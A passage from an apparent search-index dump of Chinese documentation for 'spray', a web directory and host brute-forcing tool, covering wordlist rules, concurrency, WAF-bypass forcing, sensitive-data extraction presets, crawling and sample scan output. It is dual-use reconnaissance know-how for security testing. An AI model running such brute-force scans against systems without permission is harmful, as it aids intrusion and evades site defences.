<pre><code>spray -u http://example.com -d word.txt --rule-filter \"&gt;15\"\n</code></pre> <p>\u8fd9\u884c\u547d\u4ee4\u8868\u793a, \u6307\u5b9a\u5b57\u5178, \u5e76\u8fc7\u6ee4\u6389\u957f\u5ea6\u5927\u4e8e 15 \u7684\u5b57\u5178.</p>"},{"location":"spray/start/#\u9884\u914d\u7f6e\u7684\u4fbf\u6377\u7528\u6cd5","title":"\u9884\u914d\u7f6e\u7684\u4fbf\u6377\u7528\u6cd5","text":"<p>\u5728\u4f7f\u7528\u57fa\u4e8e\u63a9\u7801\u6216\u57fa\u4e8e\u89c4\u5219\u7684\u5b57\u6bb5\u751f\u6210\u5668\u65f6, \u9700\u8981\u5927\u91cf\u7684\u624b\u52a8\u914d\u7f6e\u548c\u6d4b\u8bd5. \u8fd9\u5f88\u9ebb\u70e6, \u6240\u4ee5spray\u63d0\u4f9b\u4e86\u4e00\u4e9b\u9884\u8bbe\u5feb\u901f\u5b9e\u73b0\u4e00\u4e9b\u5e38\u7528\u914d\u7f6e. </p> <p>\u6240\u6709\u7684\u9884\u8bbe\u5b9e\u9645\u4e0a\u90fd\u662f\u901a\u8fc7\u9884\u5148\u914d\u7f6e\u7684words \u5b9e\u73b0.</p> <p>\u901a\u8fc7words\u7684\u63a9\u7801\u914d\u7f6e\u5b9e\u73b0\u7684: </p> <ol> <li><code>--suffix</code> \u5728\u5b57\u5178\u540e\u9762\u6dfb\u52a0\u540e\u7f00, \u53ef\u6dfb\u52a0\u591a\u4e2a, \u4e0e\u539f\u6709\u7684\u5b57\u5178\u7ec4\u6210\u7b1b\u5361\u5c14\u79ef</li> <li><code>--prefix</code> \u5728\u5b57\u5178\u524d\u9762\u6dfb\u52a0\u524d\u7f00, \u53ef\u6dfb\u52a0\u591a\u4e2a, \u4e0e\u539f\u6709\u7684\u5b57\u5178\u7ec4\u6210\u7b1b\u5361\u5c14\u79ef</li> <li><code>-e</code>/<code>--extension</code> \u6dfb\u52a0\u62d3\u5c55\u540d, \u9017\u53f7\u5206\u5272</li> </ol> <p>\u901a\u8fc7words\u7684function\u5b9e\u73b0\u7684: </p> <ol> <li><code>-L</code>/<code>--lowercase</code> \u5c06\u5b57\u5178\u4e2d\u7684\u6240\u6709\u5b57\u6bcd\u8f6c\u6362\u4e3a\u5c0f\u5199</li> <li><code>-U</code>/<code>--uppercase</code> \u5c06\u5b57\u5178\u4e2d\u7684\u6240\u6709\u5b57\u6bcd\u8f6c\u6362\u4e3a\u5927\u5199</li> <li><code>--replace</code> \u66ff\u6362\u5b57\u5178\u4e2d\u7684\u5b57\u7b26, \u4f8b\u5982<code>--replace aaa=bbb</code> \u5c06\u5b57\u5178\u4e2d\u7684 a \u66ff\u6362\u4e3a b, \u53ef\u4ee5\u6dfb\u52a0\u591a\u4e2a<code>--replace</code></li> <li><code>--remove-extension</code> \u5220\u9664\u5b57\u5178\u4e2d\u7684\u6587\u4ef6\u6269\u5c55\u540d, \u9017\u53f7\u5206\u5272</li> <li><code>--exclude-extension</code> \u6392\u9664\u5b57\u5178\u4e2d\u7684\u6587\u4ef6\u6269\u5c55\u540d, \u9017\u53f7\u5206\u5272</li> <li><code>--skip</code> \u8df3\u8fc7\u5b58\u5728\u6307\u5b9a\u5173\u952e\u5b57\u7684\u5b57\u5178</li> <li><code>force-extension</code> \u5f3a\u5236\u6dfb\u52a0\u540e\u7f00\u540d, \u4e0d\u8bba\u662f\u5426\u5df2\u7ecf\u5b58\u5728</li> </ol> <p>\u5b57\u5178\u751f\u6210\u5668\u7684\u4f18\u5148\u7ea7</p> <pre><code>flowchart TD\n    A(\u5c06 `-w` \u4e0e `-d` \u89e3\u6790\u6210 words \u8868\u8fbe\u5f0f) --&gt; B(\u57fa\u4e8e\u63a9\u7801\u7684\u51fd\u6570\u88c5\u9970\u5668)\n    B --&gt; C(\u57fa\u4e8e\u63a9\u7801\u7684\u5b57\u5178\u751f\u6210\u5668)\n    C --&gt; D(\u57fa\u4e8e\u89c4\u5219\u7684\u5b57\u5178\u751f\u6210\u5668)\n    D --&gt; E(\u57fa\u4e8e\u89c4\u5219\u7684\u8fc7\u6ee4\u5668)\n    E --&gt; F(words\u88c5\u9970\u5668)\n    F --&gt; G(\u9001\u5165\u5230 channel \u4e2d)</code></pre>"},{"location":"spray/start/#input","title":"Input","text":"<p>\u652f\u6301\u4e09\u79cd\u4e0d\u540c\u7c7b\u578b\u7684\u8f93\u5165:</p> <ul> <li><code>-u</code>/<code>--url</code> , \u4ece\u547d\u4ee4\u884c\u4e2d\u6dfb\u52a0 url \u4f5c\u4e3a\u4efb\u52a1.</li> <li><code>-l</code>/<code>--list</code> , \u4ece\u6587\u4ef6\u4e2d\u9009\u62e9\u591a\u4e2a url \u4f5c\u4e3a\u4efb\u52a1. \u5c06\u4f1a\u81ea\u52a8\u5f00\u542f\u5e76\u53d1\u6a21\u5f0f, \u652f\u6301\u591a\u4e2a\u4efb\u52a1\u540c\u65f6\u8fdb\u884c, \u5e76\u6bcf\u4e2a\u4efb\u52a1\u90fd\u6709\u81ea\u5df1\u7684 keep-alive \u7684\u8fde\u63a5\u6c60</li> <li><code>-c/--cidr</code> \u8f93\u5165\u6307\u5b9a\u7f51\u6bb5, \u4f8b\u5982 <code>spray -c 1.1.1.1/24</code></li> <li><code>-p/--port</code> \u6307\u5b9a\u591a\u4e2a\u7aef\u53e3, \u89c4\u5219\u4e0e gogo \u4e00\u81f4, \u4f8b\u5982<code>spray -u http://example -p top2</code></li> <li><code>--default</code> \u542f\u7528\u9ed8\u8ba4\u5b57\u5178, \u5b57\u5178\u6765\u81ea dirsearch</li> <li><code>--resume</code> , \u9009\u62e9 stat \u6587\u4ef6\u65ad\u70b9\u7eed\u4f20</li> </ul> <p>\u5e76\u4e14\u8fd8\u6709\u4e00\u4e9b\u53c2\u6570\u53ef\u4ee5\u63a7\u5236\u4efb\u52a1.</p> <ul> <li><code>--offset</code> , \u5b57\u5178\u504f\u79fb</li> <li><code>--limit</code>, \u9650\u5236\u7684\u5b57\u5178\u6570\u91cf</li> <li><code>--deadline</code> \u6240\u6709\u4efb\u52a1\u7684\u6700\u5927\u65f6\u95f4\u9650\u5236, \u8d85\u65f6\u4e86\u4f1a\u4fdd\u5b58\u5f53\u524d\u8fdb\u5ea6\u7684 stat \u6587\u4ef6\u540e\u9000\u51fa</li> <li><code>--force</code> \u5ffd\u7565\u6389\u88ab ban \u6216\u88ab waf \u7684\u5224\u65ad, \u5f3a\u5236\u8dd1\u5b8c\u6240\u6709\u5b57\u5178</li> </ul>"},{"location":"spray/start/#\u901f\u7387\u9650\u5236","title":"\u901f\u7387\u9650\u5236","text":"<p>\u5408\u7406\u7684\u901f\u7387\u914d\u7f6e\u80fd\u8ba9 spray \u7684\u6027\u80fd\u5927\u5927\u63d0\u5347.</p> <ul> <li>\u901a\u8fc7 <code>-p</code>/<code>--pool</code> \u914d\u7f6e\u5e76\u884c\u7684\u4efb\u52a1\u6570, \u6bcf\u4e2a url \u90fd\u4f1a\u5206\u914d\u5230\u4e00\u4e2a\u72ec\u7acb\u7684 pool.</li> <li>\u901a\u8fc7<code>-t</code>/ <code>--thread</code> \u6bcf\u4e2a pool \u7684\u5e76\u53d1\u6570, \u9700\u8981\u6ce8\u610f\u7684\u662f, thread \u4e0e\u6bcf\u79d2\u5b9e\u9645\u53d1\u5305\u901f\u7387\u65e0\u5173</li> <li>\u901a\u8fc7<code>--rate-limit</code> \u914d\u7f6e\u6bcf\u4e2a pool \u7684\u6bcf\u79d2\u53d1\u5305\u4e0a\u9650\u901f\u5ea6.</li> <li>\u901a\u8fc7<code>--timeout</code> \u914d\u7f6e\u6bcf\u4e2a\u8bf7\u6c42\u7684\u8d85\u65f6\u65f6\u95f4, \u5982\u679c\u76ee\u6807\u7684 waf \u4f1a\u901a\u8fc7 drop packet \u7684\u65b9\u5f0f\u54cd\u5e94, \u9002\u5f53\u8c03\u4f4e timeout \u53ef\u4ee5\u52a0\u5feb\u7206\u7834\u901f\u5ea6.</li> </ul>"},{"location":"spray/start/#\u7206\u7834\u65b9\u5f0f","title":"\u7206\u7834\u65b9\u5f0f","text":"<p>\u901a\u8fc7<code>-m</code> \u6307\u5b9a\u7206\u7834\u65b9\u5f0f, \u9ed8\u8ba4\u4e3a path, \u5f53\u524d\u652f\u6301<code>path</code>, <code>host</code>\u4e24\u79cd\u6a21\u5f0f</p> <p>path</p> <p>path \u6a21\u5f0f, \u5b57\u5178\u5c06\u4f1a\u62fc\u63a5\u5230\u8f93\u5165\u7684 url \u4e4b\u540e</p> <p>host</p> <p>host \u6a21\u5f0f, \u5b57\u5178\u5c06\u4f1a\u66ff\u6362 header \u4e2d\u7684 host \u5b57\u6bb5</p>"},{"location":"spray/start/#client","title":"client","text":"<p>\u5f53\u524d spray \u91c7\u7528\u4e86 net/http \u4e0e fasthttp \u4f5c\u4e3a\u5907\u9009\u7684 client, \u540e\u7eed\u8fd8\u5c06\u517c\u5bb9\u652f\u6301 http2/http3 \u7684 client.</p> <p>\u56e0\u4e3a fasthttp \u6307\u5b9a host \u65f6\u4f1a\u8fdb\u884c\u4e00\u6b21 dns \u89e3\u6790, \u5bfc\u81f4\u51fa\u73b0\u62a5\u9519, \u56e0\u6b64, \u5728 path \u7206\u7834\u65f6\u5c06\u4f7f\u7528 fasthttp. \u5728 host \u7206\u7834\u65f6\u5c06\u4f7f\u7528 net/http.</p> <p>fasthttp \u7684\u6027\u80fd\u8fdc\u9ad8\u4e8e net/http, \u56e0\u6b64\u4e0d\u5efa\u8bae\u624b\u52a8\u4fee\u6539\u914d\u7f6e. \u5982\u679c\u6709\u76f8\u5173\u7684\u7279\u6b8a\u9700\u6c42, \u53ef\u4ee5\u901a\u8fc7<code>-c</code>/<code>--client</code> <code>auto</code>/<code>standard</code>/<code>fast</code>\u8fdb\u884c\u4fee\u6539. \u9ed8\u8ba4\u4e3a auto.</p> <p>\u4f7f\u7528 fasthttp \u9700\u8981\u6ce8\u610f</p> <p>\u5982\u679c\u76ee\u6807\u4f7f\u7528\u4e86<code>chunked</code>, \u90a3\u4e48 fasthttp \u5f88\u53ef\u80fd\u65e0\u6cd5\u6b63\u786e\u83b7\u53d6\u89e3\u7801\u540e\u7684 body, \u9700\u8981\u4f7f\u7528<code>-c standard</code>\u5207\u6362\u6210 go \u81ea\u5e26\u7684<code>net/http</code> . \u6211\u539f\u672c\u4ee5\u4e3a\u80fd\u627e\u5230\u4e00\u4e2a header \u53bb\u5728 client \u5173\u95ed chunk, \u4f3c\u4e4e\u5e76\u6ca1\u6709\u5bf9\u5e94\u7684\u65b9\u6cd5.</p>"},{"location":"spray/start/#\u8bf7\u6c42\u81ea\u5b9a\u4e49","title":"\u8bf7\u6c42\u81ea\u5b9a\u4e49","text":"<p><code>--header \"HEADER: aaa\"</code> \u53ef\u6dfb\u52a0\u81ea\u5b9a\u4e49\u7684 header \u5934, \u53ef\u6dfb\u52a0\u591a\u4e2a<code>--header</code>\u6765\u6dfb\u52a0\u591a\u4e2a header</p> <p><code>--cookie \"Session: sess\"</code> \u53ef\u6dfb\u52a0\u81ea\u5b9a\u4e49\u7684 cookie, \u53ef\u6dfb\u52a0\u591a\u4e2a<code>--cookie</code>\u6765\u6dfb\u52a0\u591a\u4e2a cookie</p> <p><code>--user-agent \"Spray0.1.0\"</code> \u53ef\u6dfb\u52a0\u6307\u5b9a\u7684 UA</p> <p><code>--random-agent</code> \u6253\u5f00\u81ea\u52a8\u968f\u673a UA \u66ff\u6362</p> <p><code>--raw file</code> \u7c7b\u4f3c sqlmap \u7684<code>-r</code>\u53c2\u6570 , \u9009\u62e9\u7eaf\u6587\u672c\u7684\u8bf7\u6c42\u6a21\u677f, \u540e\u7eed\u7684\u8bf7\u6c42\u90fd\u4f1a\u4f7f\u7528\u8fd9\u4e2a\u6a21\u677f\u6784\u9020, todo</p>"},{"location":"spray/start/#output","title":"Output","text":"<p>spray \u9ed8\u8ba4\u8f93\u51fa\u5230\u7ec8\u7aef\u7684\u683c\u5f0f\u662f human-like \u6587\u672c. \u5e76\u9ed8\u8ba4\u5f00\u542f\u7684 title \u83b7\u53d6 \u4e0e \u88ab\u52a8\u6307\u7eb9\u8bc6\u522b \u529f\u80fd.</p> \u547d\u4ee4\u884c\u8f93\u51fa\u6848\u4f8b <p><code>spray --no-bar -u http:/example.com  -w '/{?l}' -a --extract url</code> <pre><code>[*] Parsed 26 words by /{?l} , 2023-01-04 11:16.30\n[*] Loaded 1 urls from cmd , 2023-01-04 11:16.30\n[*] Loaded 0 dictionaries and 0 decorators , 2023-01-04 11:16.30\n[+] [baseline.index] http:/example.com/ - 200 - 6326 - 70ms [\u89e3\u51b3\u65b9\u6848\uff0c\u4e00\u67e5\u5c31\u6709] [nginx]   , 2023-01-04 11:16.30\n[+] [baseline.random] http:/example.com/PgtrqWohCJJLckw - 404 - 169 - 30ms [404 Not Found] [nginx]   , 2023-01-04 11:16.30\n[+] http:/example.com/static/js/chunk-libs.89fc8520.js - 200 - 0 - 116ms [nginx]\n[+] http:/example.com/static/js/chunk-elementUI.80b6d1d0.js - 200 - 0 - 153ms [nginx]\n[+] http:/example.com/static/js/app.72fc17fc.js - 200 - 68582 - 170ms [nginx] [ url:17 items ][ crawl:109 items ]\n  url:\n        http://www.w3.org/2000/svg\n        https://github.com/PanJiaChen/vue-admin-template/\n        https://panjiachen.github.io/vue-element-admin-site/#/\n  crawl:\n        https://github.com/PanJiaChen/vue-admin-template/\n        https://panjiachen.github.io/vue-element-admin-site/#/\n        https://beian.miit.gov.cn\n        /uploadFile/uploadFile\n        /userInfo/userInfo\n        /userAccount/userAccount\n        /userDocument/userDocument\n        /userMake/userMake\n        /userVip/userVip\n        /userInvite/userInvite\n        /userCollection/userCollection\n        /demand-form/demand-form\n        /login\n        /dashboard\n        /login?redirect=\n        /home\n        /userMake\n        /pay\n        /pay/success\n        /paySuccess\n        /pay/success\n        /PaySuccess\n        /wxLogin\n        /404\n        /prod-api/api\n[+] http:/example.com/prod-api/api - 404 - 124 - 35ms [{\\\"timestamp\\\":] [focus:springboot]  [nginx] [ crawl:/api ]\n  crawl:\n        /api\n[*] [stat] http:/example.com took 0 s, request total: 125, finish: 26/26, found: 4, check: 0, failed: 0 , 2023-01-04 11:16.30\n[*] [stat] http:/example.com 404: 120, 200: 3, , 2023-01-04 11:16.30\n</code></pre></p> <p>\u9ed8\u8ba4\u5c06\u4f1a\u8f93\u51fa\u8fdb\u5ea6\u6761, \u4f46\u662f\u8fdb\u5ea6\u6761\u5728 windows \u7684\u5404\u79cd terminal \u4e0b\u4f1a\u6709\u4e9b\u8f93\u51fa bug. \u53ef\u4ee5\u901a\u8fc7<code>--no-bar</code>\u5355\u72ec\u5173\u95ed\u8fdb\u5ea6\u6761.</p> <p>\u9ed8\u8ba4\u7684\u547d\u4ee4\u884c\u8f93\u51fa\u662f\u5e26\u989c\u8272\u7684, \u53ef\u4ee5\u901a\u8fc7<code>--no-color</code> \u5173\u95ed\u7740\u8272.</p> <p>\u5982\u679c\u9700\u8981\u5c06 spray \u7684\u7ed3\u679c\u4f20\u9012\u7ed9\u5176\u4ed6\u5de5\u5177, \u9700\u8981\u5173\u95ed\u5404\u79cd\u65e5\u5fd7\u8f93\u51fa, \u7740\u8272, \u8fdb\u5ea6\u6761\u7b49\u65e0\u7528\u8f93\u51fa. \u53ef\u4ee5\u6dfb\u52a0<code>-q</code>/<code>--quiet</code>\u5173\u95ed\u975e\u5fc5\u8981\u8f93\u51fa.</p> <p>\u5982\u679c\u9700\u8981\u67e5\u770b\u6240\u6709\u7ec6\u8282, \u53ef\u4ee5\u6dfb\u52a0<code>--debug</code>. \u4e0d\u8bba\u7ed3\u679c\u662f\u5426\u6709\u6548, \u8f93\u51fa\u6bcf\u4e2a\u54cd\u5e94\u7684\u7ec6\u8282</p>"},{"location":"spray/start/#\u8f93\u51fa\u6d41","title":"\u8f93\u51fa\u6d41","text":"<p>\u9664\u4e86\u9ed8\u8ba4\u914d\u7f6e\u4e0b\u6700\u76f4\u89c2\u7684\u547d\u4ee4\u884c\u8f93\u51fa, spray \u652f\u6301\u4e00\u4e2a\u81ea\u7531\u7684\u8f93\u51fa\u6d41\u914d\u7f6e.</p> <ul> <li><code>-f/--file</code> \u9ed8\u8ba4\u8f93\u51fa\u6d41, \u6307\u5b9a\u6709\u6548\u7ed3\u679c\u7684\u8f93\u51fa\u6587\u4ef6</li> <li><code>--dump-file</code> \u5168\u90e8\u8bf7\u6c42\u7684\u8f93\u51fa\u6d41, \u6307\u5b9a\u6bcf\u4e2a\u53d1\u51fa\u7684\u5305\u4e0e\u54cd\u5e94\u7ed3\u679c\u7684\u8f93\u51fa\u6587\u4ef6</li> </ul> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b, \u88ab\u667a\u80fd\u8fc7\u6ee4\u4e2d\u7684\u6a21\u7cca\u8fc7\u6ee4\u6389\u7684\u8f93\u51fa\u4e0d\u4f1a\u8f93\u51fa\u5230\u547d\u4ee4\u884c\u6216\u8005\u6587\u4ef6. \u4f46\u6a21\u7cca\u8fc7\u6ee4\u7684\u7ed3\u679c\u5b58\u5728\u6f0f\u62a5/\u8bef\u62a5\u7684\u53ef\u80fd, \u56e0\u6b64\u5f88\u591a\u65f6\u5019\u8fd8\u9700\u8981\u8fdb\u884c\u4e8c\u6b21\u5904\u7406.</p> <p>\u4e00\u4e9b\u4fbf\u6377\u5316\u7684\u53c2\u6570:</p> <ul> <li><code>--fuzzy</code> \u6253\u5f00\u547d\u4ee4\u884c\u7684\u6a21\u7cca\u8fc7\u6ee4\u7ed3\u679c\u8f93\u51fa.</li> <li><code>--auto-file</code> \u81ea\u52a8\u6839\u636e\u4efb\u52a1\u6307\u5b9a\u6587\u4ef6\u540d</li> <li><code>--dump</code>\u81ea\u52a8\u6307\u5b9a dump \u6587\u4ef6\u7684\u6587\u4ef6\u540d</li> <li><code>--no-stat</code> \u5c06\u4e0d\u4f1a\u81ea\u52a8\u521b\u5efa<code>.stat</code> \u6587\u4ef6</li> <li><code>-j</code>/<code>--json</code> \u6807\u51c6\u8f93\u51fa\u4e2d\u7684\u8f93\u51fa\u683c\u5f0f\u542f\u7528json\u683c\u5f0f</li> </ul>"},{"location":"spray/start/#probe","title":"Probe","text":"<p>\u9ed8\u8ba4\u7684 baseline \u4e2d\u8fd8\u6709\u8bb8\u591a\u6570\u636e\u9ed8\u8ba4\u72b6\u6001\u4e0b\u4e0d\u4f1a\u8f93\u51fa, \u53ef\u4ee5\u901a\u8fc7<code>--probe</code>\u53c2\u6570\u53bb\u81ea\u5b9a\u4e49\u60f3\u8981\u8f93\u51fa\u7684\u5185\u5bb9.</p> <p>\u5f53\u524d\u652f\u6301\u7684 probe \u6709</p> <ul> <li><code>url</code></li> <li><code>host</code></li> <li><code>title</code></li> <li><code>redirect</code></li> <li><code>md5</code>, body \u7684 MD5</li> <li><code>simhash</code>, body \u7684 simhash</li> <li><code>mmh3</code>, body \u7684 mmh3</li> <li><code>stat</code>/<code>status</code>, \u72b6\u6001\u7801</li> <li><code>spend</code>, \u8017\u8d39\u7684\u65f6\u95f4, \u5355\u4f4d\u6beb\u79d2</li> <li><code>extract</code> \u63d0\u53d6\u7684\u7ed3\u679c</li> <li><code>frame</code> \u6307\u7eb9, \u9ed8\u8ba4\u5f00\u542f\u88ab\u52a8\u6307\u7eb9\u8bc6\u522b,</li> <li><code>cpe</code> , <code>cpe:2.3:a:microsoft:windows_10:1909:*:*:*:*:*:*:*****</code></li> <li><code>wfn</code> , <code>wfn:[part=\"a\", vendor=\"microsoft\", product=\"windows_10\", version=\"1909\"]</code></li> <li><code>uri</code>, <code>cpe:/a:microsoft:windows_10:1909</code></li> </ul> <p>\u901a\u8fc7<code>spray -o url,host,title,md5,frame</code> \u5373\u53ef\u81ea\u7531\u7ec4\u5408 probe \u63a7\u5236\u8f93\u51fa\u5185\u5bb9</p>"},{"location":"spray/start/#\u8f93\u51fa\u5230\u6587\u4ef6","title":"\u8f93\u51fa\u5230\u6587\u4ef6","text":"<p>\u4f7f\u7528<code>-f</code> \u6307\u5b9a\u8f93\u51fa\u6587\u4ef6\u540d</p> <p>\u4f7f\u7528<code>-O json</code> (\u9ed8\u8ba4)\u6216<code>-O csv</code> \u6307\u5b9a\u6587\u4ef6\u8f93\u51fa\u683c\u5f0f.</p> <p>\u9ed8\u8ba4\u8f93\u51fa\u5230\u6587\u4ef6\u7684\u683c\u5f0f\u4e3a json</p> json \u8f93\u51fa\u683c\u5f0f\u6848\u4f8b <pre><code>{\n    \"number\": 0,\n    \"url\": \"http://example/static/js/app.72fc17fc.js\",\n    \"path\": \"//static/js/app.72fc17fc.js\",\n    \"host\": \"\",\n    \"body_length\": 68582,\n    \"header_length\": 255,\n    \"status\": 200,\n    \"spend\": 405,\n    \"title\": \"\",\n    \"frameworks\": [\n        {\n            \"name\": \"nginx\",\n            \"tags\": [\n                \"other\"\n            ]\n        }\n    ],\n    \"extracts\": [\n        {\n            \"name\": \"url\",\n            \"extract_result\": [\n                \"http://www.w3.org/2000/svg\",\n                \"https://github.com/PanJiaChen/vue-admin-template/\",\n                \"http://www.w3.org/2000/svg\",\n                \"https://beian.miit.gov.cn\",\n            ]\n        },\n        {\n            \"name\": \"crawl\",\n            \"extract_result\": [\n                \"https://github.com/PanJiaChen/vue-admin-template/\",\n                \"https://panjiachen.github.io/vue-element-admin-site/#/\",\n                \"https://beian.miit.gov.cn\",\n                \"/uploadFile/uploadFile\",\n                \"/userInfo/userInfo\",\n                \"/userAccount/userAccount\",\n                \"/userDocument/userDocument\",\n                \"/userMake/userMake\",\n                \"/userVip/userVip\",\n                \"/userInvite/userInvite\",\n                \"/userCollection/userCollection\",\n                \"/demand-form/demand-form\",\n                \"/login\",\n            ]\n        }\n    ],\n    \"error\": \"\",\n    \"reason\": \"\",\n    \"valid\": true,\n    \"fuzzy\": false,\n    \"source\": 5,\n    \"depth\": 1,\n    \"hashes\": {\n        \"body-md5\": \"d7190390f194cd8a09cbdf132ee0bb6e\",\n        \"header-md5\": \"19bf7ec8a759066bdf8bbc1a90804244\",\n        \"raw-md5\": \"8c00b45ac0c33c51074270a47620318d\",\n        \"body-simhash\": \"af63bd4c8601b7ae\",\n        \"header-simhash\": \"9833941ee6ab8d6d\",\n        \"raw-simhash\": \"af63bd4c8601b7ae\",\n        \"body-mmh3\": \"2409784245\"\n    }\n}\n</code></pre> <p>\u9664\u4e86<code>-f</code> \u6307\u5b9a\u7684\u6587\u4ef6\u540d\u5916, \u8fd8\u4f1a\u6839\u636e\u4efb\u52a1\u7c7b\u578b\u751f\u6210<code>***.stat</code>\u7684\u8fdb\u5ea6\u6587\u4ef6, \u7528\u6765\u4fdd\u5b58\u4efb\u52a1\u7684\u72b6\u6001\u4e0e\u8fdb\u5ea6\u4fe1\u606f. \u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u6587\u4ef6\u5224\u65ad\u76ee\u6807\u5927\u81f4\u7684\u72b6\u51b5.</p> stat \u8f93\u51fa\u6848\u4f8b <pre><code>{\n    \"url\": \"http://101.132.126.181/\",\n    \"counts\": {\n        \"200\": 3,\n        \"404\": 104\n    },\n    \"failed\": 0,\n    \"req_total\": 109,\n    \"check\": 0,\n    \"found\": 4,\n    \"filtered\": 0,\n    \"fuzzy\": 0,\n    \"wafed\": 0,\n    \"end\": 26,\n    \"offset\": 0,\n    \"total\": 26,\n    \"start_time\": 1672802906,\n    \"end_time\": 1672802907,\n    \"word_count\": 26,\n    \"word\": \"/{?l}\",\n    \"dictionaries\": null,\n    \"rule_files\": null,\n    \"rule_filter\": \"\"\n}\n</code></pre> <p>spray \u533a\u5206\u4e86\u4e0d\u540c\u7c7b\u578b\u7684\u8f93\u51fa, \u53ea\u6709\u901a\u8fc7\u6240\u6709\u8fc7\u6ee4\u5668\u7684\u7ed3\u679c\u624d\u4f1a\u8f93\u51fa\u5230<code>-f</code>\u6307\u5b9a\u7684\u6587\u4ef6\u4e2d.</p>"},{"location":"spray/start/#extract\u63d0\u53d6\u5668","title":"extract/\u63d0\u53d6\u5668","text":"<p>spray \u6709\u4e00\u4e2a\u7c7b\u4f3c gogo \u7684 extract \u7684\u529f\u80fd. \u7528\u6765\u4ece\u7f51\u9875\u4e2d\u63d0\u53d6\u7279\u5b9a\u6570\u636e.</p> <p>\u53ef\u4ee5\u901a\u8fc7<code>--extract regexp</code>, \u81ea\u5b9a\u4e49\u6b63\u5219\u8868\u8fbe\u5f0f\u53bb\u63d0\u53d6\u6570\u636e. <code>--extract</code> \u53ef\u4ee5\u6dfb\u52a0\u591a\u4e2a.</p> <p>extract \u4e5f\u5b58\u5728\u4e00\u4e9b\u5e38\u7528\u7684\u9884\u8bbe, <code>--extract ip</code></p> <ul> <li>url</li> <li>ip</li> <li>mail</li> <li>idcard</li> <li>phone</li> <li>header</li> <li>body</li> <li>cookie</li> <li>response</li> </ul>"},{"location":"spray/start/#config","title":"Config","text":"<p>spray\u7684\u5728\u9ad8\u7ea7\u7528\u6cd5\u4e0b\u914d\u7f6e\u8f83\u4e3a\u590d\u6742, \u73b0\u5728\u63d0\u4f9b\u4e86config\u6587\u4ef6\u53ef\u4ee5\u5c06\u4e00\u4e9b\u5e38\u7528\u53c2\u6570\u56fa\u5b9a\u4e0b\u6765. </p> <p>spray\u6267\u884c\u65f6\u4f1a\u81ea\u52a8\u5bfb\u627e\u5f53\u524d\u76ee\u5f55\u4e0b\u7684<code>config.yaml</code>\u6587\u4ef6, \u5982\u679c\u4e0d\u5b58\u5728\u5219\u4e0d\u4f1a\u542f\u7528</p> <p>\u751f\u6210\u521d\u59cb\u914d\u7f6e, \u9ed8\u8ba4\u4f4d\u4e8e\u5f53\u524d\u76ee\u5f55\u4e0b</p> <p><code>spray --init</code></p> <p>\u624b\u52a8\u6267\u884cconfig\u6587\u4ef6</p> <p><code>spray -c custom.yaml</code> </p>"},{"location":"spray/start/#\u62d3\u5c55\u63d2\u4ef6","title":"\u62d3\u5c55\u63d2\u4ef6","text":"<p>\u542f\u7528\u5168\u90e8\u63d2\u4ef6</p> <p><code>-a</code>/ <code>advance</code> \u5c06\u540c\u65f6\u4e0a\u8ff0\u5f00\u542f\u6240\u6709\u529f\u80fd, \u5e76\u4e14\u529f\u80fd\u4e4b\u95f4\u8fd8\u4f1a\u4ea4\u53c9\u7ec4\u5408\u51fa\u4e00\u4e9b\u60ca\u559c.</p>"},{"location":"spray/start/#finger","title":"finger","text":"<p>check/brute\u901a\u7528</p> <p><code>--finger</code> \u6253\u5f00\u5168\u90e8\u7684\u6307\u7eb9\u5f15\u64ce</p> <p>\u6253\u5f00\u5219\u8c03\u7528 https://github.com/chainreactors/fingers \u7684\u5168\u91cf\u6307\u7eb9\u5e93\u8fdb\u884c\u8bc6\u522b, \u4e0d\u6253\u5f00\u5219\u9ed8\u8ba4\u53ea\u8c03\u7528fingers\u539f\u751f\u6307\u7eb9\u5e93</p>"},{"location":"spray/start/#recon","title":"recon","text":"<p>check/brute\u901a\u7528</p> <p><code>--recon</code> \u6253\u5f00\u654f\u611f\u4fe1\u606f\u63d0\u53d6</p> <p>\u63d0\u53d6\u89c4\u5219\u5e93\u4f4d\u4e8e: https://github.com/chainreactors/templates/blob/master/extract.yaml</p> <p>\u5305\u542b\u4e86\u4f18\u5316\u540e\u7684jsfinder\u5f15\u64ce, \u914d\u5408\u76ee\u5f55\u7206\u7834\u548ccrawl, \u53ef\u4ee5\u8fbe\u5230\u610f\u60f3\u4e0d\u5230\u7684\u6548\u679c</p>"},{"location":"spray/start/#crawl","title":"crawl","text":"<p>\u4ec5brute\u53ef\u7528</p> <p>crawl \u662f\u57fa\u4e8elinkfinder\u6b63\u5219\u7684\u5927\u91cf\u4f18\u5316\u540e\u7684\u63d2\u4ef6, \u6bd4\u539f\u751f\u7684linkfinder\u5f3a\u6570\u500d, \u5e76\u4e14\u80fd\u9012\u5f52\u4f5c\u7528.</p> <p>\u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528linkfinder, \u5f3a\u70c8\u63a8\u8350\u4f7f\u7528crawl\u4ee3\u66fflinkfinder.</p> <ul> <li><code>--crawl</code> \u53ef\u4ee5\u5f00\u542f\u722c\u866b. \u9650\u5b9a\u722c\u866b\u7684\u6df1\u5ea6\u4e3a 3, \u4e14\u53ea\u80fd\u4f5c\u7528\u4e8e\u5f53\u524d\u4f5c\u7528\u57df, \u9700\u8981\u66f4\u52a0\u81ea\u7531\u914d\u7f6e\u7684\u722c\u866b\u914d\u7f6e\u8bf7\u4f7f\u7528\u90a3\u51e0\u4e2a headless \u722c\u866b. \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u722c\u866b\u53ea\u722c\u53d6\u81ea\u8eab\u4f5c\u7528\u57df</li> <li><code>--scope *.example.com</code> \u5c06\u5141\u8bb8\u722c\u866b\u722c\u5230\u6307\u5b9a\u4f5c\u7528\u57df</li> <li><code>--no-scope</code> \u53d6\u6d88\u6240\u6709\u4f5c\u7528\u57df\u9650\u5236</li> <li><code>--read-all</code> \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5982\u679c\u722c\u866b\u722c\u5230\u7684\u67d0\u4e9b\u6587\u4ef6\u8fc7\u5927, \u5c06\u53ea\u8bfb\u53d6\u524d 16k \u6570\u636e, \u5bfc\u81f4\u722c\u866b\u5931\u6548. \u53ef\u4ee5\u6dfb\u52a0\u8be5\u53c2\u6570\u89e3\u9664\u54cd\u5e94\u5927\u5c0f\u7684\u9650\u5236</li> </ul> <p>\u5728\u57fa\u672c\u4fe1\u606f\u63a2\u6d4b\u65f6\u4f7f\u7528\u722c\u866b</p> <p>--crawl 